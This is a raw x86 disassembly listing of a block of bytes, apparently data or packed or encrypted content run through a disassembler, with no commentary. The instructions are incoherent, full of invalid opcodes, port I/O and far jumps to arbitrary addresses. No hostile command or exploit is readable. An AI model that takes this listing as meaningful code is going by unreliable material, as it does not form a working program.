  40cd8e:	sbb    al,0xe9
  40cd90:	add    al,BYTE PTR ds:0x7671f81a
  40cd96:	jp     0x40ce0b
  40cd98:	fiadd  WORD PTR [ecx]
  40cd9a:	not    BYTE PTR [edi-0x59]
  40cd9d:	cdq    
  40cd9e:	lea    ebx,[esi-0x7bceddaa]
  40cda4:	sbb    al,0x91
  40cda6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cda7:	ins    DWORD PTR es:[edi],dx
  40cda8:	mov    eax,0x876df93d
  40cdad:	call   0x95c6:0xe26a9e52
  40cdb4:	popf   
  40cdb5:	shl    DWORD PTR [edx+0x20],cl
  40cdb8:	cwde   
  40cdb9:	idiv   BYTE PTR [edi]
  40cdbb:	mov    esi,0x5f08d037
  40cdc0:	xor    al,0xf
  40cdc2:	sti    
  40cdc3:	lock sbb DWORD PTR [ebp+eax*8+0xf8d5a43],eax
  40cdcb:	shl    DWORD PTR [edx-0x6be4f2d],0xf2
  40cdd2:	add    ebp,DWORD PTR [esi+0x7eb41ed0]
  40cdd8:	adc    eax,DWORD PTR [eax]
  40cdda:	dec    eax
  40cddb:	(bad)  [ecx-0xb]
  40cdde:	and    DWORD PTR ds:0x87670132,0x51
  40cde5:	inc    esi
  40cde6:	(bad)  
  40cde7:	outs   dx,DWORD PTR ds:[esi]
  40cde8:	jp     0x40cda2
  40cdea:	sbb    BYTE PTR [ebx],dh
  40cdec:	push   eax
  40cded:	pop    esi
  40cdee:	fbld   TBYTE PTR [esi-0x5a2c511b]
  40cdf4:	rol    BYTE PTR [eax+0x62256eea],cl
  40cdfa:	add    edi,DWORD PTR [ecx-0x4e1770e9]
  40ce00:	retf   0x7897
  40ce03:	pop    edi
  40ce04:	popa   
  40ce05:	jge    0x40ce07
  40ce07:	fcom   QWORD PTR [edi]
  40ce09:	sar    DWORD PTR [edi],cl
  40ce0b:	(bad)  
  40ce0c:	jae    0x40ce5a
  40ce0e:	xlat   BYTE PTR ds:[ebx]
  40ce0f:	pusha  
  40ce10:	adc    edi,DWORD PTR [edx-0x2ed83d9b]
  40ce16:	hlt    
  40ce17:	in     al,dx
  40ce18:	jnp    0x40cde9
  40ce1a:	add    bl,ch
  40ce1c:	jb     0x40ce26
  40ce1e:	fld    st(2)
  40ce20:	imul   edx,DWORD PTR [eax+esi*1],0x2d012770
  40ce27:	pushf  
  40ce28:	repz or ebx,DWORD PTR [edi-0x41]
  40ce2c:	xchg   DWORD PTR [ebp-0x80],ecx
  40ce2f:	(bad)  
  40ce30:	cmp    dh,BYTE PTR [edx-0x37]
  40ce33:	sub    DWORD PTR [ebx-0x71547198],esp
  40ce39:	(bad)  
  40ce3a:	mov    ebx,0x61ef079b
  40ce3f:	push   eax
  40ce40:	mov    ebp,0xfa2d8a6e
  40ce45:	mov    WORD PTR [esi+0x5d0ccb65],es
  40ce4b:	jae    0x40ceb7
  40ce4d:	inc    ebp
  40ce4e:	or     eax,0xa38954e1
  40ce53:	test   bh,bh
  40ce55:	sti    
  40ce56:	pop    ds
  40ce57:	add    ch,BYTE PTR [ebp+0x1c]
  40ce5a:	or     BYTE PTR [eax+0x35],0x3c
  40ce5e:	arpl   WORD PTR [ecx-0x5e4f42da],bx
  40ce64:	in     eax,dx
  40ce65:	sar    dh,cl
  40ce67:	ins    BYTE PTR es:[edi],dx
  40ce68:	repnz pushf 
  40ce6a:	stos   BYTE PTR es:[edi],al
  40ce6b:	loope  0x40cea1
  40ce6d:	neg    edx
  40ce6f:	(bad)  
  40ce70:	sahf   
  40ce71:	xchg   DWORD PTR [edx],edi
  40ce73:	add    DWORD PTR [ecx+0x17],edx
  40ce76:	out    0x5a,al
  40ce78:	pop    DWORD PTR [esi]
  40ce7a:	xor    BYTE PTR [esi-0x11c8e07b],ah
  40ce80:	xchg   ebp,eax
  40ce81:	or     BYTE PTR [ebx-0x3],ch
  40ce84:	imul   esp,DWORD PTR [edi+0x6a],0x216dddfc
  40ce8b:	test   al,0x9f
  40ce8d:	inc    edx
  40ce8e:	xchg   edi,eax
  40ce8f:	jmp    0x15b2:0xa3c8ac25
  40ce96:	mov    bl,dl
  40ce98:	ret    0x5583
  40ce9b:	shr    edx,1
  40ce9d:	sbb    eax,esp
  40ce9f:	cli    
  40cea0:	or     BYTE PTR [ebx],dh
  40cea2:	or     ecx,edi
  40cea4:	(bad)  [eax+0x5f3587a]
  40ceab:	and    DWORD PTR [ecx+0x6c461b10],esp
  40ceb1:	jg     0x40cebd
  40ceb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ceb4:	or     eax,DWORD PTR ds:0x6dadff02
  40ceba:	push   ebp
  40cebb:	xchg   ebp,eax
  40cebc:	aad    0x38
  40cebe:	rcl    edx,1
  40cec0:	jl     0x40ce86
  40cec2:	rcr    edi,1
  40cec4:	ror    BYTE PTR [edx-0x645b4268],1
  40ceca:	lock gs out dx,eax
  40cecd:	aad    0x50
  40cecf:	add    eax,0x5aac3bcd
  40ced4:	(bad)  
  40ced5:	pop    ecx
  40ced6:	in     al,0xee
  40ced8:	arpl   WORD PTR [esp+ecx*4+0x66],bp
  40cedc:	(bad)  
  40cedd:	push   0xffffffea
  40cedf:	dec    esi
  40cee0:	stc    
  40cee1:	sub    dl,ch
  40cee3:	test   al,0xe6
  40cee5:	add    al,0x47
  40cee7:	jne    0x40cf23
  40cee9:	jbe    0x40cf34
  40ceeb:	repz jge 0x40cf2c
  40ceee:	sub    DWORD PTR [edi-0x16445678],edx
  40cef4:	aad    0x17
  40cef6:	jge    0x40cf5d
  40cef8:	in     al,dx
  40cef9:	lds    eax,FWORD PTR [edi+0x147e24d]
  40ceff:	outs   dx,BYTE PTR ds:[esi]
  40cf00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf01:	aad    0x2d
  40cf03:	pop    eax
  40cf04:	int3   
  40cf05:	test   BYTE PTR [eax+0x71],dl
  40cf08:	lods   eax,DWORD PTR ds:[esi]
  40cf09:	inc    ecx
  40cf0a:	jne    0x40cf59
  40cf0c:	jnp    0x40cea4
  40cf0e:	retf   0x2f46
  40cf11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf12:	xor    esp,esi
  40cf14:	hlt    
  40cf15:	nop
  40cf16:	repz inc ebp
  40cf18:	clc    
  40cf19:	out    0x29,eax
  40cf1b:	fmul   st(3),st
  40cf1d:	sub    BYTE PTR [eax+0xe6b9989],cl
  40cf23:	in     al,dx
  40cf24:	jecxz  0x40ceee
  40cf26:	out    dx,eax
  40cf27:	mov    bl,0xc8
  40cf29:	sti    
  40cf2a:	mov    eax,ds:0x3cfbf2f5
  40cf2f:	outs   dx,DWORD PTR ds:[esi]
  40cf30:	push   cs
  40cf31:	aam    0x3
  40cf33:	ins    BYTE PTR es:[edi],dx
  40cf34:	sbb    eax,0x6ccae647
  40cf39:	xchg   DWORD PTR [ebp-0x6764ce41],ebx
  40cf3f:	xchg   esi,eax
  40cf40:	lea    edx,[ecx]
  40cf42:	and    edi,0x74
  40cf45:	jns    0x40cedd
  40cf47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf48:	ffree  st(1)
  40cf4b:	jp     0x40cf3b
  40cf4d:	mov    eax,0xed1d5994
  40cf52:	mov    ebx,0x4b75d7d4
  40cf57:	daa    
  40cf58:	in     al,0x83
  40cf5a:	test   BYTE PTR [bp+di+0x5e],0x84
  40cf5f:	outs   dx,BYTE PTR ds:[esi]
  40cf60:	aad    0xc2
  40cf62:	pop    edx
  40cf63:	or     eax,0x8cc80a10
  40cf68:	les    edi,FWORD PTR [edx+0x549fd5f1]
  40cf6e:	in     eax,0xff
  40cf70:	fwait
  40cf71:	repnz (bad) 
  40cf73:	retf   0xaf10
  40cf76:	fild   DWORD PTR [esi-0x6e]
  40cf79:	lods   eax,DWORD PTR ds:[esi]
  40cf7a:	and    al,BYTE PTR [esi-0x1b]
  40cf7d:	ds cld 
  40cf7f:	call   0x82089a72
  40cf84:	jo     0x40cfbc
  40cf86:	sub    dh,al
  40cf88:	or     BYTE PTR [edx],0xa7
  40cf8b:	jl     0x40cf7d
  40cf8d:	jns    0x40cfef
  40cf8f:	cmp    ebx,eax
  40cf91:	lea    edx,[ecx-0x724a17d7]
  40cf97:	out    dx,eax
  40cf98:	jp     0x40cf5d
  40cf9a:	jae    0x40cfc6
  40cf9c:	retf   0x4a10
  40cf9f:	div    BYTE PTR [ebx+eiz*8+0x33ea4735]
  40cfa6:	shr    al,cl
  40cfa8:	imul   BYTE PTR ds:0xf358d5de
  40cfae:	(bad)  
  40cfaf:	push   edx
  40cfb0:	retf   0x38e5
  40cfb3:	jnp    0x40d019
  40cfb5:	sbb    eax,0xa5a4a34f
  40cfba:	stos   DWORD PTR es:[edi],eax
  40cfbb:	repnz xor al,ah
  40cfbe:	xor    ecx,DWORD PTR [edi-0x6afeb7c4]
  40cfc4:	jne    0x40d032
  40cfc6:	xor    eax,0xe31072ef
  40cfcb:	arpl   WORD PTR ds:0x90583230,di
  40cfd1:	cs mov cl,0x9
  40cfd4:	mov    al,ds:0xed5cd2eb
  40cfd9:	out    dx,al
  40cfda:	in     al,0x27
  40cfdc:	cld    
  40cfdd:	mov    esi,0xc70ca028
  40cfe2:	outs   dx,BYTE PTR ds:[esi]
  40cfe3:	repnz and al,0xe7
  40cfe6:	(bad)  [edx]
  40cfe8:	cld    
  40cfe9:	outs   dx,BYTE PTR ds:[esi]
  40cfea:	cmp    ecx,ecx
  40cfec:	xor    esi,DWORD PTR [ebx]
  40cfee:	mov    bh,0xbb
  40cff0:	push   0x16
  40cff2:	(bad)  
  40cff3:	in     eax,dx
  40cff4:	loopne 0x40cf9d
  40cff6:	cmc    
  40cff7:	pop    dx
  40cff9:	and    eax,0x37f2db62
  40cffe:	cld    
  40cfff:	xor    DWORD PTR es:[ecx-0x4c],ebx
  40d003:	stos   DWORD PTR es:[edi],eax
  40d004:	sub    bl,ch
  40d006:	jmp    0xa7e4ab71
  40d00b:	or     ebx,ecx
  40d00d:	fcomip st,st(0)
  40d00f:	sbb    dh,0xad
  40d012:	popa   
  40d013:	add    eax,0x70e9afcb
  40d018:	jne    0x40cfd0
  40d01a:	cmp    eax,0xd8d7dcc0
  40d01f:	cmp    eax,0xc1e90fe5
  40d024:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d025:	xchg   ebx,eax
  40d026:	cmp    edx,0x44
  40d029:	or     DWORD PTR [ebx],0x5e
  40d02c:	xchg   BYTE PTR [ebx-0x680465ab],dl
  40d032:	retf   
  40d033:	mov    bx,di
  40d036:	dec    esi
  40d037:	cmp    edi,ecx
  40d039:	stos   BYTE PTR es:[edi],al
  40d03a:	xor    eax,0xf4591e0b
  40d03f:	inc    edi
  40d040:	icebp  
  40d041:	pop    es
  40d042:	gs cmc 
  40d044:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d045:	lds    ebx,FWORD PTR [edi-0x2]
  40d048:	pop    esi
  40d049:	das    
  40d04a:	mov    ah,0x37
  40d04c:	daa    
  40d04d:	cmp    esi,DWORD PTR [edi+0x7210d8bf]
  40d053:	cli    
  40d054:	and    eax,0xd1212a45
  40d059:	daa    
  40d05a:	xchg   ebp,eax
  40d05b:	js     0x40cfea
  40d05d:	(bad)  
  40d05e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d05f:	arpl   si,cx
  40d061:	push   edi
  40d062:	xchg   ecx,eax
  40d063:	int    0x19
  40d065:	ss mov ch,0xc
  40d068:	fldln2 
  40d06a:	mov    eax,esp
  40d06c:	cmp    esi,edx
  40d06e:	mov    ds:0xe1c1f2fd,al
  40d073:	test   eax,0x2490690f
  40d078:	cs test al,0x6a
  40d07b:	(bad)  [ebp+0xf]
  40d07e:	inc    edx
  40d07f:	out    0x4f,al
  40d081:	cmp    al,0xa9
  40d083:	aam    0xc8
  40d085:	pop    ebp
  40d086:	sub    esp,DWORD PTR [eax-0xf]
  40d089:	rcl    edi,cl
  40d08b:	adc    BYTE PTR [edx],0x1d
  40d08e:	inc    ebx
  40d08f:	dec    edi
  40d090:	mov    bl,0x76
  40d092:	fisub  WORD PTR [edi]
  40d094:	fdivrp st(1),st
  40d096:	push   eax
  40d097:	mov    al,0x30
  40d099:	inc    edx
  40d09a:	lea    esi,[esi-0x3e]
  40d09d:	cs in  al,dx
  40d09f:	mov    ebp,DWORD PTR [edi+eiz*4+0x79]
  40d0a3:	test   BYTE PTR [edi+0x173b2a00],ah
  40d0a9:	mov    bh,0x63
  40d0ab:	jmp    0x320ec824
  40d0b0:	xchg   esi,eax
  40d0b1:	mov    ch,0x71
  40d0b3:	jo     0x40d0ec
  40d0b5:	push   cs
  40d0b6:	(bad)  
  40d0b7:	push   ds
  40d0b8:	sbb    eax,0xe6dc0e74
  40d0bd:	jge    0x40d089
  40d0bf:	sar    bl,cl
  40d0c1:	int3   
  40d0c2:	rol    edx,0x60
  40d0c5:	ds pop edx
  40d0c7:	(bad)  
  40d0c8:	(bad)  
  40d0c9:	cli    
  40d0ca:	xchg   esp,eax
  40d0cb:	popa   
  40d0cc:	xchg   ecx,eax
  40d0cd:	sti    
  40d0ce:	xchg   esi,eax
  40d0cf:	not    DWORD PTR [edi]
  40d0d1:	adc    BYTE PTR [edi+0x3c412430],ah
  40d0d7:	lods   al,BYTE PTR ds:[esi]
  40d0d8:	xchg   ecx,eax
  40d0d9:	lds    edx,FWORD PTR [edx+ebp*8+0x0]
  40d0dd:	fist   DWORD PTR [edx-0x34224355]
  40d0e3:	xor    bh,cl
  40d0e5:	xor    esi,ebx
  40d0e7:	or     edx,edx
  40d0e9:	xchg   ecx,eax
  40d0ea:	mov    ds:0x9879f5,eax
  40d0ef:	pop    ss
  40d0f0:	out    dx,al
  40d0f1:	inc    edi
  40d0f2:	push   esi
  40d0f3:	sbb    ebx,ebx
  40d0f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0f6:	popf   
  40d0f7:	aaa    
  40d0f8:	and    al,0xf
  40d0fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0fb:	(bad)  
  40d0fc:	stos   DWORD PTR es:[edi],eax
  40d0fd:	push   esi
  40d0fe:	or     eax,0xa756a1a8
  40d103:	inc    ebx
  40d104:	jecxz  0x40d130
  40d106:	sub    dl,BYTE PTR [ebx+0x55]
  40d109:	push   edi
  40d10a:	adc    edi,ebp
  40d10c:	cs retf 
  40d10e:	aam    0x62
  40d110:	bound  ebx,QWORD PTR [edi-0x260edba]
  40d116:	xchg   ecx,eax
  40d117:	mov    eax,ds:0x8c288bf3
  40d11c:	add    DWORD PTR [edi-0x39],eax
  40d11f:	push   ebx
  40d120:	xor    BYTE PTR ds:0xf2870c41,ch
  40d126:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d127:	pop    esi
  40d128:	inc    esp
  40d129:	add    dh,BYTE PTR [edx-0x42]
  40d12c:	push   ecx
  40d12d:	push   edx
  40d12e:	cmp    eax,0x9a3f16cb
  40d133:	aad    0x64
  40d135:	mov    ebp,0xf82fa9ef
  40d13a:	adc    cl,BYTE PTR [esi]
  40d13c:	jne    0x40d155
  40d13e:	mov    edx,0x681ea2b5
  40d143:	aad    0xfd
  40d145:	inc    esi
  40d146:	cmp    eax,0xb87fbbae
  40d14b:	jmp    0x40d0e5
  40d14d:	add    al,BYTE PTR [ebx-0x73]
  40d150:	sub    edx,edi
  40d152:	mov    ah,0x7b
  40d154:	jmp    0xeefd5f47
  40d159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d15a:	cs enter 0xdbc1,0xc1
  40d15f:	xor    al,0xc4
  40d161:	push   ebp
  40d162:	xlat   BYTE PTR ds:[ebx]
  40d163:	fmul   st,st(3)
  40d165:	sahf   
  40d166:	imul   edx,DWORD PTR [ecx],0xc7a081e5
  40d16c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d16d:	nop
  40d16e:	sub    eax,0xc0d06b94
  40d173:	mul    DWORD PTR [ecx]
  40d175:	pop    ebx
  40d176:	inc    ebp
  40d177:	or     eax,0x20f9ff1d
  40d17c:	(bad)  
  40d17d:	sub    bl,ah
  40d17f:	fild   QWORD PTR [esi+ebp*2+0x24efc4fa]
  40d186:	enter  0x1f7a,0x2
  40d18a:	xchg   DWORD PTR [ebp+0x3a],esp
  40d18d:	shl    DWORD PTR [esi+eiz*4],1
  40d190:	mov    eax,0xb4d99b91
  40d195:	push   edi
  40d196:	and    ah,ah
  40d198:	jb     0x40d1ad
  40d19a:	lahf   
  40d19b:	xchg   ebp,eax
  40d19c:	adc    ebx,DWORD PTR [edi]
  40d19e:	sub    bh,dh
  40d1a0:	shl    BYTE PTR [ecx+0x74c1e7bd],cl
  40d1a6:	rol    BYTE PTR [ecx+0x56e97f12],cl
  40d1ac:	jb     0x40d1cc
  40d1ae:	push   edi
  40d1af:	daa    
  40d1b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1b1:	lds    esp,FWORD PTR [edx+0x28a07130]
  40d1b7:	mov    esp,0x32348cb5
  40d1bc:	iret   
  40d1bd:	in     eax,dx
  40d1be:	(bad)  
  40d1bf:	mov    ecx,0xe72b65cf
  40d1c4:	mov    BYTE PTR [edi-0x3c],bl
  40d1c7:	xor    ah,ch
  40d1c9:	(bad)  
  40d1ca:	cld    
  40d1cb:	ret    0x4a
  40d1ce:	xchg   BYTE PTR [eax],dh
  40d1d0:	aas    
  40d1d1:	mov    ch,0x5a
  40d1d3:	push   ss
  40d1d4:	les    edi,FWORD PTR fs:[ebx+0x85b1ea6]
  40d1db:	adc    ah,BYTE PTR [edi-0x5d]
  40d1de:	pop    es
  40d1df:	pop    ds
  40d1e0:	inc    ebp
  40d1e1:	mov    ds:0xd283657b,al
  40d1e6:	jbe    0x40d1b0
  40d1e8:	push   edx
  40d1e9:	sbb    DWORD PTR [edi+0x5],0xffffff87
  40d1ed:	int3   
  40d1ee:	outs   dx,DWORD PTR ds:[esi]
  40d1ef:	jp     0x40d24d
  40d1f1:	sbb    BYTE PTR [esi],0x59
  40d1f4:	cs jns 0x40d1d1
  40d1f7:	and    ecx,DWORD PTR [esi-0x5a]
  40d1fa:	and    bl,dl
  40d1fc:	mov    bh,0xd8
  40d1fe:	dec    edx
  40d1ff:	inc    ebx
  40d200:	jmp    DWORD PTR [eax+0x65aa56d5]
  40d206:	(bad)  
  40d207:	or     bh,ch
  40d209:	add    DWORD PTR gs:[ebx-0x43eef646],ecx
  40d210:	inc    edx
  40d211:	jp     0x40d1fd
  40d213:	ret    0xab99
  40d216:	retf   
  40d217:	xchg   BYTE PTR [eax+0x7672a949],ch
  40d21d:	pop    ebx
  40d21e:	inc    ecx
  40d21f:	es add al,0xe
  40d222:	mov    ch,BYTE PTR [ebx+edi*8-0x91c237c]
  40d229:	mov    dl,0x5a
  40d22b:	cmp    BYTE PTR [ecx-0x41],dh
  40d22e:	xlat   BYTE PTR ds:[ebx]
  40d22f:	push   edx
  40d230:	xchg   ecx,eax
  40d231:	push   edi
  40d232:	sbb    DWORD PTR ds:[edx-0x31db3b87],edi
  40d239:	mov    DWORD PTR [ebx-0x3232e7ef],esp
  40d23f:	pushf  
  40d240:	jl     0x40d299
  40d242:	pop    edx
  40d243:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d244:	jle    0x40d217
  40d246:	lods   al,BYTE PTR ds:[esi]
  40d247:	jnp    0x40d2a9
  40d249:	add    dh,ah
  40d24b:	jae    0x40d275
  40d24d:	leave  
  40d24e:	sub    al,0x7b
  40d250:	call   0xf1d27aa2
  40d255:	jbe    0x40d2a9
  40d257:	inc    ebp
  40d258:	mov    BYTE PTR [ebp-0x5d],ch
  40d25b:	int3   
  40d25c:	outs   dx,DWORD PTR ds:[esi]
  40d25d:	dec    esi
  40d25e:	in     eax,0xfa
  40d260:	loop   0x40d262
  40d262:	jb     0x40d276
  40d264:	sbb    ah,BYTE PTR [esi-0x31]
  40d267:	mov    edx,0x69498e8e
  40d26c:	mov    ds,WORD PTR ds:0x44ddd511
  40d272:	(bad)  
  40d274:	mov    al,ds:0x8f27d2a7
  40d279:	ins    DWORD PTR es:[edi],dx
  40d27a:	cmp    ebp,DWORD PTR [ebp+0x55]
  40d27d:	(bad)  
  40d27e:	int3   
  40d27f:	inc    edx
  40d280:	xchg   ecx,eax
  40d281:	int    0xf8
  40d283:	fld    QWORD PTR [edi+ebx*1-0x3f]
  40d287:	aaa    
  40d288:	stc    
  40d289:	mov    ch,0xa0
  40d28b:	(bad)  
  40d28c:	cmp    dh,BYTE PTR [ecx-0x4c]
  40d28f:	jecxz  0x40d286
  40d291:	and    BYTE PTR [ecx],0xb7
  40d294:	fisttp WORD PTR [esi+0x39df0c68]
  40d29a:	aam    0x22
  40d29c:	retf   0x2e1a
  40d29f:	stos   BYTE PTR es:[edi],al
  40d2a0:	lea    ebx,[edx+ebx*2-0x1ffd68eb]
  40d2a7:	push   esp
  40d2a8:	jecxz  0x40d23b
  40d2aa:	mov    bh,0x19
  40d2ac:	sbb    ecx,DWORD PTR [eax]
  40d2ae:	(bad)  
  40d2af:	push   edx
  40d2b0:	ins    DWORD PTR es:[edi],dx
  40d2b1:	xchg   edi,eax
  40d2b2:	fcomp  QWORD PTR ds:0x262921fc
  40d2b8:	cmp    DWORD PTR [eax+0x1],edx
  40d2bb:	dec    ecx
  40d2bc:	mov    eax,ds:0xf52a3cb5
  40d2c1:	(bad)
  40d2c5:	sub    DWORD PTR [edi+ebp*8+0x5d],0xffffffaf
  40d2ca:	cmp    DWORD PTR [esi-0x3360948e],ecx
  40d2d0:	repz rcl BYTE PTR [ecx+0x66],cl
  40d2d4:	stos   DWORD PTR es:[edi],eax
  40d2d5:	rcl    BYTE PTR [edx+0x1a],1
  40d2d8:	jb     0x40d359
  40d2da:	xor    bh,dh
  40d2dc:	mov    cl,0x9b
  40d2de:	(bad)  
  40d2df:	and    edx,DWORD PTR [ebx]
  40d2e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2e2:	cmp    BYTE PTR [ebp-0x4983ca13],bl
  40d2e8:	mov    cl,0xd1
  40d2ea:	and    esp,0x80b9c630
  40d2f0:	jno    0x40d340
  40d2f2:	sbb    eax,0xf574cae3
  40d2f7:	adc    ebx,DWORD PTR [ecx]
  40d2f9:	out    dx,eax
  40d2fa:	sub    dh,bl
  40d2fc:	xor    BYTE PTR [ebx+0xef95a89],cl
  40d302:	lods   eax,DWORD PTR ds:[esi]
  40d303:	loope  0x40d306
  40d305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d306:	shl    BYTE PTR [esi-0xc],0xa6
  40d30a:	loope  0x40d342
  40d30c:	and    cl,BYTE PTR [edx]
  40d30e:	pop    eax
  40d30f:	ins    BYTE PTR es:[edi],dx
  40d310:	jmp    0x5380:0x27b07900
  40d317:	ds inc edx
  40d319:	sti    
  40d31a:	adc    DWORD PTR [ecx-0x1204684e],ebp
  40d320:	mov    dl,0x92
  40d322:	out    0x72,eax
  40d324:	out    dx,eax
  40d325:	xor    DWORD PTR [edi-0x5f6e2969],ebp
  40d32b:	leave  
  40d32c:	out    0x89,eax
  40d32e:	add    eax,edx
  40d330:	icebp  
  40d331:	enter  0x1ef2,0x3a
  40d335:	sbb    BYTE PTR [eax],al
  40d337:	mov    eax,ds:0x4ef5b18
  40d33c:	fdivr  st,st(5)
  40d33e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d33f:	mov    ds:0xf2e18707,eax
  40d344:	out    0x53,eax
  40d346:	sbb    ebx,DWORD PTR [eax+0x5f]
  40d349:	(bad)  
  40d34a:	push   ss
  40d34b:	dec    esi
  40d34c:	jb     0x40d350
  40d34e:	dec    ecx
  40d34f:	loopne 0x40d2f9
  40d351:	inc    eax
  40d352:	and    ah,BYTE PTR [ebx]
  40d354:	jne    0x40d396
  40d356:	sub    dh,BYTE PTR [ecx+0x5bfdcbb6]
  40d35c:	ss (bad) 
  40d35e:	mov    ah,0x9a
  40d360:	retf   0xf129
  40d363:	call   0x5c36e2db
  40d368:	jae    0x40d350
  40d36a:	retf   0xfcf
  40d36d:	fnstsw WORD PTR [ebx]
  40d36f:	pop    edx
  40d370:	jnp    0x40d2f2
  40d372:	sub    eax,DWORD PTR [eax]
  40d374:	(bad)  
  40d375:	or     esi,DWORD PTR [edx+0x7c]
  40d378:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d379:	int3   
  40d37a:	fs add al,0xb2
  40d37d:	pop    edi
  40d37e:	xor    eax,0x34073e78
  40d383:	fwait
  40d384:	xor    al,0xad
  40d386:	aaa    
  40d387:	add    DWORD PTR [ebp+ecx*4-0x69cf1a5d],edx
  40d38e:	add    ebp,esi
  40d390:	mov    edi,0xfee3465c
  40d395:	sub    cl,BYTE PTR [esi-0x1a]
  40d398:	(bad)  
  40d399:	(bad)  
  40d39a:	cmp    BYTE PTR [edx],ch
  40d39c:	jecxz  0x40d3a4
  40d39e:	xor    eax,0x223bffda
  40d3a3:	cmp    BYTE PTR [edx-0x67],ch
  40d3a6:	adc    al,0x2c
  40d3a8:	hlt    
  40d3a9:	enter  0x2cd7,0x5e
  40d3ad:	mov    al,ds:0x1d19b223
  40d3b2:	sbb    DWORD PTR [edx],edi
  40d3b4:	push   edi
  40d3b5:	add    al,0xe6
  40d3b7:	sub    dh,BYTE PTR [ebx]
  40d3b9:	mov    ebx,DWORD PTR [edi-0x3e]
  40d3bc:	mov    esi,0x6ea11093
  40d3c1:	inc    esp
  40d3c2:	push   0x72
  40d3c4:	sbb    dh,dl
  40d3c6:	les    ebx,FWORD PTR [eax-0x12]
  40d3c9:	xchg   eax,ecx
  40d3cb:	push   DWORD PTR [ebx]
  40d3cd:	mov    cl,0xce
  40d3cf:	scas   eax,DWORD PTR es:[edi]
  40d3d0:	dec    BYTE PTR [esi-0x6ef432e]
  40d3d6:	int    0x1e
  40d3d8:	inc    edx
  40d3d9:	jg     0x40d37d
  40d3db:	stc    
  40d3dc:	cmp    DWORD PTR [ebx],esi
  40d3de:	ss in  eax,dx
  40d3e0:	jmp    0xf882:0x7f341e6
  40d3e7:	popaw  
  40d3e9:	fsubr  st(3),st
  40d3eb:	xchg   ebp,eax
  40d3ec:	jl     0x40d419
  40d3ee:	aaa    
  40d3ef:	mov    bh,BYTE PTR [esp+eax*4]
  40d3f2:	arpl   dx,di
  40d3f4:	sar    DWORD PTR [eax],cl
  40d3f6:	xor    BYTE PTR [esp+esi*8],bl
  40d3f9:	mov    BYTE PTR [edx+0x60b63e3f],ah
  40d3ff:	mov    esp,0xd60ffd16
  40d404:	xor    edx,DWORD PTR [eax+edx*2-0x2aa455da]
  40d40b:	mov    edx,0x760935df
  40d410:	add    al,0xe
  40d412:	xor    edx,DWORD PTR [eax+ebp*2-0x6f]
  40d416:	(bad)  
  40d417:	pop    ecx
  40d418:	mov    bh,bh
  40d41a:	mov    ebx,0xd78edc9a
  40d41f:	pop    ebx
  40d420:	pushf  
  40d421:	push   ss
  40d422:	shr    cl,0xca
  40d425:	cmp    DWORD PTR [edi],0xb7c5dce8
  40d42b:	mul    BYTE PTR [edi-0x2bddda09]
  40d431:	mov    esp,db5
  40d434:	xchg   DWORD PTR gs:[ebp+eiz*8-0x6b5e9891],ebp
  40d43c:	jge    0x40d3c2
  40d43e:	jb     0x40d467
  40d440:	xor    dh,BYTE PTR [edi]
  40d442:	nop
  40d443:	fbld   TBYTE PTR [edx+0x2bc855f1]
  40d449:	sahf   
  40d44a:	mov    ebx,0x6f366b48
  40d44f:	jo     0x40d49f
  40d451:	push   ds
  40d452:	test   BYTE PTR [ebx-0x3e],0x88
  40d456:	bound  eax,QWORD PTR [eax+0x18378daf]
  40d45c:	loopne 0x40d44d
  40d45e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d45f:	(bad)
  40d464:	push   ecx
  40d465:	es call 0x1893d43
  40d46b:	mov    ch,ah
  40d46d:	xchg   edi,eax
  40d46e:	(bad)  
  40d46f:	jg     0x40d449
  40d471:	push   esi
  40d472:	fist   DWORD PTR [esi+0x72]
  40d475:	fild   QWORD PTR [ebx-0x18b90116]
  40d47b:	jns    0x40d4e6
  40d47d:	jns    0x40d4c2
  40d47f:	out    dx,al
  40d480:	mov    WORD PTR [edi-0x2ccec9af],ds
  40d486:	lds    ebp,FWORD PTR [edi-0x7b223280]
  40d48c:	es mov bl,0xce
  40d48f:	inc    ecx
  40d490:	into   
  40d491:	mov    WORD PTR [eax-0x11],fs
  40d494:	mov    eax,ds:0x16a89fdc
  40d499:	mov    es,WORD PTR [esi]
  40d49b:	test   BYTE PTR [edx],bh
  40d49d:	js     0x40d447
  40d49f:	call   0xb023:0x3d05eefc
  40d4a6:	data16 icebp 
  40d4a8:	lea    edx,[ebx-0x5f]
  40d4ab:	cwde   
  40d4ac:	jp     0x40d4be
  40d4ae:	mov    ds:0x5e6b5a17,eax
  40d4b3:	popa   
  40d4b4:	sub    esi,DWORD PTR [ecx]
  40d4b6:	jmp    0x40d4c2
  40d4b8:	fdiv   DWORD PTR [ebx-0x26b67721]
  40d4be:	ficomp WORD PTR [ecx+0x388d627d]
  40d4c4:	mov    edx,0xf8ac2686
  40d4c9:	xchg   ebp,eax
  40d4ca:	sti    
  40d4cb:	pop    ss
  40d4cc:	scas   eax,DWORD PTR es:[edi]
  40d4cd:	pop    esp
  40d4ce:	push   ebp
  40d4cf:	mov    gs,esi
  40d4d1:	enter  0x72c7,0x1b
  40d4d5:	je     0x40d465
  40d4d7:	jecxz  0x40d539
  40d4d9:	fst    QWORD PTR [ebx]
  40d4db:	addr16 je 0x40d483
